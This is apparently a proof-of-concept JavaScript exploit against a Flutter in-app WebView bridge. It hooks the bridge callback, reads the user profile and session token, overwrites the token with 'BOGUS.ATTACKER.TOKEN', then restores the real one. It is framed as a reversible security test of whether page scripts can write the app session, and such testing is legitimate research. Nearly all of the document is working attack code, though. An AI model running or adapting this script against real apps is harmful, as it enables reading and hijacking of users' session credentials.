// Does the bridge also let the page WRITE the app session? Break-and-restore, fully reversible:
// the real token is captured in step 1 and put back in step 4. Nothing is hardcoded or shipped.
(function () {
  var L = [], real = null, step = 0;
  function log(s) { L.push(s); render(); }
  function render() {
    document.documentElement.innerHTML =
      "<pre style='font:12px monospace;white-space:pre-wrap;word-break:break-all;background:#fff;color:#000;padding:6px'>"
      + "=== updateToken WRITE TEST ===\n" + L.join("\n") + "</pre>";
  }
  window._b_bridge_callback_ = function (o) {
    try {
      var d = (typeof o === "string") ? JSON.parse(o) : o;
      if (d.methodName === "getUserProfile") {
        var t = d.params && d.params.userToken;
        log("step" + step + " getUserProfile -> uid=" + (d.params && d.params.uid) +
            " tokenLen=" + (t ? t.length : 0) + " tokenTail=" + (t ? t.slice(-12) : "(none)"));
        if (step === 1 && t) real = t;
      } else {
        log("cb " + d.moduleName + "." + d.methodName + " code=" + d.code);
      }
    } catch (e) { log("cb parse err " + e); }
  };
  window.invokeCallback = window._b_bridge_callback_;
  function call(m, f, p) {
    return window.flutter_inappwebview.callHandler("_b_bridge_" + m + "_",
      JSON.stringify({ moduleName: m, methodName: f, uniqueId: "w" + (++step) + Math.random().toString(36).slice(2), params: p || {} }));
  }
  render();
  step = 1; call("UserProfile", "getUserProfile", {});
  setTimeout(function () {
    log("\n-> calling UserProfile.updateToken with a bogus token");
    step = 2; call("UserProfile", "updateToken", { token: "BOGUS.ATTACKER.TOKEN" });
  }, 4000);
  setTimeout(function () { step = 3; log("\n-> re-reading profile after the bogus write"); call("UserProfile", "getUserProfile", {}); }, 8000);
  setTimeout(function () {
    if (real) { log("\n-> restoring the real token"); step = 4; call("UserProfile", "updateToken", { token: real }); }
    else log("\n!! real token not captured, NOT restoring");
  }, 12000);
  setTimeout(function () { step = 5; log("\n-> final profile read"); call("UserProfile", "getUserProfile", {}); }, 16000);
})();
